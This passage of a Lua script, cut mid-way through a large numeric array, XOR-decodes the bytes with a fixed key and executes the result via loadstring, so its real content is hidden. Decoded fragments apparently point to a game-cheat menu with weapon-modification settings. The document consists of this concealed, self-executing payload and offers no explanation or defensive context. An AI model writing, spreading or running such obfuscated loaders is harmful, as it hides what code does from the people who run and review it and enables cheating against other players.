145, 66, 60, 48, 232, 30, 250, 113, 145, 9, 112, 119, 172, 27, 251, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 229, 25, 180, 115, 216, 104, 42, 31, 164, 93, 217, 106, 134, 84, 53, 59, 223, 28, 230, 108, 146, 85, 123, 119, 172, 30, 250, 97, 194, 87, 119, 16, 237, 18, 241, 37, 223, 28, 121, 124, 223, 26, 224, 113, 139, 79, 62, 45, 193, 16, 240, 112, 142, 68, 123, 126, 248, 23, 241, 107, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 77, 54, 61, 237, 19, 180, 106, 137, 13, 121, 51, 227, 27, 180, 56, 194, 81, 58, 63, 224, 19, 188, 119, 135, 80, 44, 55, 254, 26, 184, 37, 148, 8, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 55, 234, 95, 251, 110, 194, 64, 55, 58, 172, 11, 237, 117, 135, 9, 52, 49, 232, 86, 180, 56, 223, 1, 123, 42, 237, 29, 248, 96, 192, 1, 56, 48, 232, 95, 224, 124, 146, 68, 113, 51, 227, 27, 186, 67, 139, 83, 60, 12, 237, 11, 241, 44, 194, 28, 100, 126, 174, 17, 225, 104, 128, 68, 43, 124, 172, 11, 252, 96, 140, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 203, 119, 146, 76, 20, 49, 232, 10, 248, 96, 145, 122, 122, 1, 254, 15, 249, 72, 141, 69, 44, 50, 233, 12, 191, 52, 191, 1, 100, 126, 225, 16, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 211, 13, 228, 104, 173, 83, 48, 57, 215, 18, 251, 97, 191, 1, 100, 126, 225, 16, 240, 43, 164, 72, 43, 59, 222, 30, 224, 96, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 26, 250, 97, 232, 1, 121, 126, 172, 26, 250, 97, 232, 43, 121, 126, 172, 95, 248, 106, 129, 64, 53, 126, 234, 10, 250, 102, 150, 72, 54, 48, 172, 32, 230, 117, 143, 96, 41, 46, 224, 6, 188, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 71, 54, 44, 172, 32, 184, 37, 143, 78, 61, 126, 229, 17, 180, 108, 146, 64, 48, 44, 255, 87, 203, 119, 146, 76, 20, 49, 232, 10, 248, 96, 145, 8, 121, 58, 227, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 41, 61, 237, 19, 248, 45, 132, 84, 55, 61, 248, 22, 251, 107, 202, 8, 121, 51, 227, 27, 186, 67, 139, 83, 60, 12, 237, 11, 241, 37, 223, 1, 6, 44, 252, 18, 221, 107, 150, 68, 43, 40, 237, 19, 180, 96, 140, 69, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 233, 17, 240, 15, 232, 1, 121, 126, 172, 19, 251, 102, 131, 77, 121, 56, 249, 17, 247, 113, 139, 78, 55, 126, 211, 13, 228, 104, 176, 68, 42, 42, 227, 13, 241, 45, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 63, 49, 254, 95, 249, 106, 134, 13, 121, 44, 237, 11, 241, 37, 139, 79, 121, 46, 237, 22, 230, 118, 202, 126, 43, 46, 225, 48, 230, 108, 133, 8, 121, 58, 227, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 41, 61, 237, 19, 248, 45, 132, 84, 55, 61, 248, 22, 251, 107, 202, 8, 121, 51, 227, 27, 186, 67, 139, 83, 60, 12, 237, 11, 241, 37, 223, 1, 43, 63, 248, 26, 180, 96, 140, 69, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 233, 17, 240, 15, 232, 1, 121, 126, 172, 40, 241, 100, 146, 114, 60, 61, 248, 22, 251, 107, 216, 117, 54, 57, 235, 19, 241, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 43, 46, 225, 95, 246, 106, 141, 82, 45, 59, 254, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 181, 68, 41, 12, 220, 50, 214, 106, 141, 82, 45, 124, 160, 95, 208, 96, 132, 64, 44, 50, 248, 95, 169, 37, 132, 64, 53, 45, 233, 83, 180, 70, 131, 77, 53, 60, 237, 28, 255, 37, 223, 1, 63, 43, 226, 28, 224, 108, 141, 79, 113, 45, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 203, 119, 146, 76, 28, 48, 237, 29, 248, 96, 134, 1, 100, 126, 255, 117, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 82, 121, 42, 228, 26, 250, 37, 150, 64, 42, 53, 162, 12, 228, 100, 149, 79, 113, 56, 249, 17, 247, 113, 139, 78, 55, 118, 165, 95, 203, 119, 146, 76, 26, 63, 239, 23, 241, 45, 203, 26, 121, 1, 254, 15, 249, 68, 146, 81, 53, 39, 164, 86, 180, 96, 140, 69, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 233, 19, 231, 96, 194, 126, 43, 46, 225, 45, 241, 118, 150, 78, 43, 59, 164, 86, 180, 96, 140, 69, 83, 126, 172, 95, 180, 96, 140, 69, 36, 119, 134, 95, 180, 37, 194, 118, 60, 63, 252, 44, 241, 102, 150, 72, 54, 48, 182, 44, 248, 108, 134, 68, 43, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 242, 108, 144, 68, 43, 63, 248, 26, 180, 45, 142, 78, 46, 59, 254, 95, 169, 37, 132, 64, 42, 42, 233, 13, 189, 39, 206, 1, 31, 50, 237, 24, 180, 56, 194, 3, 14, 59, 252, 45, 196, 72, 180, 64, 53, 124, 160, 95, 199, 124, 143, 67, 54, 50, 172, 66, 180, 39, 192, 13, 121, 26, 233, 25, 245, 112, 142, 85, 121, 99, 172, 74, 184, 37, 175, 72, 55, 126, 177, 95, 164, 41, 194, 108, 56, 38, 172, 66, 180, 52, 210, 13, 121, 26, 233, 28, 253, 104, 131, 77, 42, 126, 177, 95, 166, 41, 194, 98, 56, 50, 224, 29, 245, 102, 137, 1, 100, 126, 234, 10, 250, 102, 150, 72, 54, 48, 164, 9, 189, 15, 194, 1, 121, 126, 172, 95, 180, 37, 189, 83, 41, 51, 197, 17, 224, 96, 144, 87, 56, 50, 172, 66, 180, 115, 194, 14, 121, 111, 188, 79, 158, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 6, 44, 252, 18, 209, 107, 131, 67, 53, 59, 232, 95, 224, 109, 135, 79, 121, 1, 254, 15, 249, 68, 146, 81, 53, 39, 164, 86, 180, 96, 140, 69, 83, 126, 172, 95, 180, 96, 140, 69, 36, 119, 134, 26, 250, 97, 232, 43, 83, 84, 224, 16, 247, 100, 142, 1, 10, 31, 223, 26, 247, 113, 139, 78, 55, 126, 177, 95, 198, 100, 133, 68, 13, 63, 238, 69, 199, 96, 129, 85, 48, 49, 226, 87, 182, 118, 139, 77, 60, 48, 248, 95, 245, 108, 143, 3, 117, 126, 174, 45, 253, 98, 138, 85, 123, 119, 134, 44, 213, 86, 135, 66, 45, 55, 227, 17, 174, 73, 131, 67, 60, 50, 164, 93, 231, 108, 142, 68, 55, 42, 172, 30, 253, 104, 194, 69, 48, 45, 237, 29, 248, 96, 134, 3, 112, 84, 223, 62, 199, 96, 129, 85, 48, 49, 226, 69, 216, 100, 128, 68, 53, 118, 174, 87, 247, 112, 144, 83, 60, 48, 248, 19, 237, 37, 128, 83, 54, 53, 233, 17, 189, 39, 203, 43, 83, 84, 224, 16, 247, 100, 142, 1, 24, 48, 248, 22, 213, 108, 143, 114, 60, 61, 248, 22, 251, 107, 194, 28, 121, 12, 237, 24, 241, 81, 131, 67, 99, 13, 233, 28, 224, 108, 141, 79, 113, 124, 237, 17, 224, 108, 194, 64, 48, 51, 174, 83, 180, 39, 176, 72, 62, 54, 248, 93, 189, 15, 142, 78, 58, 63, 224, 95, 203, 113, 141, 70, 24, 31, 201, 17, 245, 103, 142, 68, 61, 126, 177, 95, 213, 107, 150, 72, 24, 55, 225, 44, 241, 102, 150, 72, 54, 48, 182, 43, 251, 98, 133, 77, 60, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 241, 107, 131, 67, 53, 59, 232, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 163, 96, 28, 48, 237, 29, 248, 96, 134, 3, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 242, 100, 142, 82, 60, 114, 172, 60, 245, 105, 142, 67, 56, 61, 231, 95, 169, 37, 132, 84, 55, 61, 248, 22, 251, 107, 202, 82, 112, 84, 172, 95, 180, 37, 189, 64, 56, 27, 226, 30, 246, 105, 135, 9, 42, 119, 134, 26, 250, 97, 159, 8, 83, 1, 248, 16, 243, 68, 163, 100, 55, 63, 238, 19, 241, 97, 216, 106, 60, 39, 238, 22, 250, 97, 202, 90, 13, 55, 248, 19, 241, 37, 223, 1, 123, 42, 227, 24, 243, 105, 135, 1, 50, 59, 245, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 163, 96, 18, 59, 245, 93, 184, 37, 169, 68, 32, 126, 177, 95, 209, 107, 151, 76, 119, 21, 233, 6, 215, 106, 134, 68, 119, 22, 160, 95, 199, 113, 131, 85, 60, 10, 245, 15, 241, 37, 223, 1, 123, 31, 224, 8, 245, 124, 145, 3, 117, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 203, 1, 60, 48, 232, 2, 189, 15, 163, 79, 45, 55, 205, 22, 249, 86, 135, 66, 45, 55, 227, 17, 174, 65, 144, 78, 41, 58, 227, 8, 250, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 52, 49, 232, 26, 182, 41, 194, 103, 53, 63, 235, 95, 169, 37, 192, 96, 24, 19, 227, 27, 241, 39, 206, 43, 121, 126, 172, 95, 216, 108, 145, 85, 121, 99, 172, 4, 182, 124, 131, 86, 104, 102, 188, 93, 184, 39, 136, 72, 45, 42, 233, 13, 182, 41, 192, 81, 48, 42, 239, 23, 182, 41, 192, 82, 41, 55, 226, 93, 184, 39, 145, 81, 48, 48, 234, 19, 253, 117, 192, 92, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 182, 124, 131, 86, 104, 102, 188, 93, 184, 15, 194, 1, 121, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 148, 8, 83, 126, 172, 95, 180, 37, 194, 1, 121, 1, 205, 62, 186, 104, 141, 69, 60, 126, 177, 95, 226, 15, 194, 1, 121, 126, 233, 17, 240, 120, 203, 43, 24, 48, 248, 22, 213, 108, 143, 114, 60, 61, 248, 22, 251, 107, 216, 114, 53, 55, 232, 26, 230, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 51, 55, 248, 11, 241, 119, 194, 64, 55, 57, 224, 26, 182, 41, 194, 103, 53, 63, 235, 95, 169, 37, 192, 96, 24, 20, 229, 11, 224, 96, 144, 96, 55, 57, 174, 83, 180, 86, 155, 76, 59, 49, 224, 95, 169, 37, 192, 69, 60, 57, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 18, 108, 114, 172, 50, 253, 107, 194, 28, 121, 111, 160, 95, 217, 100, 154, 1, 100, 126, 189, 71, 164, 41, 194, 101, 60, 61, 229, 18, 245, 105, 145, 1, 100, 126, 188, 83, 180, 70, 131, 77, 53, 60, 237, 28, 255, 37, 223, 1, 63, 43, 226, 28, 224, 108, 141, 79, 113, 40, 165, 117, 180, 37, 194, 1, 6, 31, 205, 81, 254, 108, 150, 85, 60, 44, 205, 17, 243, 37, 223, 1, 47, 84, 233, 17, 240, 120, 203, 43, 24, 48, 248, 22, 213, 108, 143, 114, 60, 61, 248, 22, 251, 107, 216, 114, 53, 55, 232, 26, 230, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 41, 55, 248, 28, 252, 37, 148, 64, 53, 43, 233, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 163, 96, 9, 55, 248, 28, 252, 83, 131, 77, 123, 114, 172, 44, 237, 104, 128, 78, 53, 126, 177, 95, 182, 97, 135, 70, 123, 114, 172, 59, 241, 99, 131, 84, 53, 42, 172, 66, 180, 61, 219, 13, 121, 19, 229, 17, 180, 56, 194, 17, 117, 126, 193, 30, 236, 37, 223, 1, 97, 103, 160, 95, 208, 96, 129, 72, 52, 63, 224, 12, 180, 56, 194, 17, 117, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 148, 8, 83, 126, 172, 95, 180, 90, 163, 96, 119, 46, 229, 11, 247, 109, 180, 64, 53, 43, 233, 95, 169, 37, 148, 43, 60, 48, 232, 2, 189, 15, 163, 79, 45, 55, 205, 22, 249, 86, 135, 66, 45, 55, 227, 17, 174, 86, 142, 72, 61, 59, 254, 87, 239, 81, 139, 85, 53, 59, 172, 66, 180, 39, 145, 81, 48, 48, 172, 12, 228, 96, 135, 69, 123, 114, 172, 57, 248, 100, 133, 1, 100, 126, 174, 62, 213, 86, 146, 72, 55, 13, 252, 26, 241, 97, 192, 13, 121, 13, 245, 18, 246, 106, 142, 1, 100, 126, 174, 27, 228, 113, 192, 13, 121, 26, 233, 25, 245, 112, 142, 85, 121, 99, 172, 78, 166, 41, 194, 108, 48, 48, 172, 66, 180, 52, 206, 1, 20, 63, 244, 95, 169, 37, 212, 17, 117, 126, 200, 26, 247, 108, 143, 64, 53, 45, 172, 66, 180, 53, 206, 1, 26, 63, 224, 19, 246, 100, 129, 74, 121, 99, 172, 25, 225, 107, 129, 85, 48, 49, 226, 87, 226, 44, 232, 1, 121, 126, 172, 32, 213, 68, 204, 82, 41, 55, 226, 44, 228, 96, 135, 69, 121, 99, 172, 9, 158, 96, 140, 69, 36, 119, 134, 117, 248, 106, 129, 64, 53, 126, 217, 56, 199, 96, 129, 85, 48, 49, 226, 95, 169, 37, 176, 64, 62, 59, 216, 30, 246, 63, 177, 68, 58, 42, 229, 16, 250, 45, 192, 84, 55, 58, 233, 13, 243, 119, 141, 84, 55, 58, 172, 13, 241, 118, 141, 77, 47, 59, 254, 93, 184, 37, 192, 115, 48, 57, 228, 11, 182, 44, 232, 77, 54, 61, 237, 19, 180, 90, 150, 78, 62, 11, 203, 58, 250, 100, 128, 77, 60, 58, 172, 66, 180, 80, 165, 114, 60, 61, 248, 22, 251, 107, 216, 117, 54, 57, 235, 19, 241, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 60, 48, 237, 29, 248, 96, 134, 3, 117, 126, 202, 19, 245, 98, 194, 28, 121, 124, 217, 17, 240, 96, 144, 70, 43, 49, 249, 17, 240, 64, 140, 64, 59, 50, 233, 27, 182, 41, 194, 101, 60, 56, 237, 10, 248, 113, 194, 28, 121, 56, 237, 19, 231, 96, 206, 1, 26, 63, 224, 19, 246, 100, 129, 74, 121, 99, 172, 25, 225, 107, 129, 85, 48, 49, 226, 87, 231, 44, 232, 1, 121, 126, 172, 32, 225, 98, 167, 79, 56, 60, 224, 26, 188, 45, 189, 102, 119, 27, 196, 32, 196, 68, 171, 101, 6, 27, 212, 58, 215, 80, 182, 110, 11, 126, 237, 17, 240, 37, 145, 8, 121, 49, 254, 95, 242, 100, 142, 82, 60, 119, 134, 26, 250, 97, 159, 8, 83, 1, 248, 16, 243, 80, 165, 100, 55, 63, 238, 19, 241, 97, 216, 106, 60, 39, 238, 22, 250, 97, 202, 90, 13, 55, 248, 19, 241, 37, 223, 1, 123, 42, 227, 24, 243, 105, 135, 1, 50, 59, 245, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 183, 102, 18, 59, 245, 93, 184, 37, 169, 68, 32, 126, 177, 95, 209, 107, 151, 76, 119, 21, 233, 6, 215, 106, 134, 68, 119, 11, 160, 95, 199, 113, 131, 85, 60, 10, 245, 15, 241, 37, 223, 1, 123, 31, 224, 8, 245, 124, 145, 3, 117, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 203, 1, 60, 48, 232, 2, 189, 15, 183, 102, 10, 59, 239, 11, 253, 106, 140, 27, 10, 50, 229, 27, 241, 119, 202, 90, 13, 55, 248, 19, 241, 37, 223, 1, 123, 58, 233, 15, 224, 109, 192, 13, 121, 24, 224, 30, 243, 37, 223, 1, 123, 11, 226, 27, 241, 119, 133, 83, 54, 43, 226, 27, 208, 96, 146, 85, 49, 124, 160, 95, 199, 124, 143, 67, 54, 50, 172, 66, 180, 39, 145, 85, 123, 114, 172, 59, 241, 99, 131, 84, 53, 42, 172, 66, 180, 55, 215, 13, 121, 19, 229, 17, 180, 56, 194, 20, 117, 126, 193, 30, 236, 37, 223, 1, 111, 110, 160, 95, 208, 96, 129, 72, 52, 63, 224, 12, 180, 56, 194, 17, 117, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 148, 8, 83, 126, 172, 95, 180, 90, 183, 102, 119, 58, 233, 15, 224, 109, 194, 28, 121, 40, 172, 80, 180, 52, 210, 43, 121, 126, 172, 95, 214, 119, 152, 114, 119, 43, 226, 27, 241, 119, 133, 83, 54, 43, 226, 27, 208, 96, 146, 85, 49, 126, 177, 95, 203, 80, 165, 15, 61, 59, 252, 11, 252, 15, 135, 79, 61, 35, 165, 117, 158, 15, 232, 126, 30, 112, 201, 55, 203, 87, 131, 70, 60, 10, 237, 29, 180, 37, 194, 28, 121, 12, 237, 24, 241, 81, 131, 67}
local g1SiD26xWWfrim = {33, 89, 94, 140, 127, 148, 5, 226}
local aC8dN89cb5vTFR = {}
for vZlLznneG3X4ZO = 1, #GIiXeS4F438D3S do
    aC8dN89cb5vTFR[vZlLznneG3X4ZO] = WVtoh6d9SKuV2A(GIiXeS4F438D3S[vZlLznneG3X4ZO],g1SiD26xWWfrim[((vZlLznneG3X4ZO-1)%#g1SiD26xWWfrim)+1])
end
local nmXuH7DhtiVorP = ''
for BNqyJ1CIXTgI0L=1,#aC8dN89cb5vTFR,256 do
    local VbRzoXbLzhx8Ea=BNqyJ1CIXTgI0L+255
    if VbRzoXbLzhx8Ea>#aC8dN89cb5vTFR then VbRzoXbLzhx8Ea=#aC8dN89cb5vTFR end
    local _t={}
    for _i=BNqyJ1CIXTgI0L,VbRzoXbLzhx8Ea do _t[#_t+1]=aC8dN89cb5vTFR[_i] end
    nmXuH7DhtiVorP=nmXuH7DhtiVorP..string.char(unpack(_t))
end
local jJBDDsa7DaeX7H = loadstring or load
local zT3Cm1FleBoNpR, kGNaee96wJ6RaL = jJBDDsa7DaeX7H(nmXuH7DhtiVorP)
if not zT3Cm1FleBoNpR then error(kGNaee96wJ6RaL) end
zT3Cm1FleBoNpR()

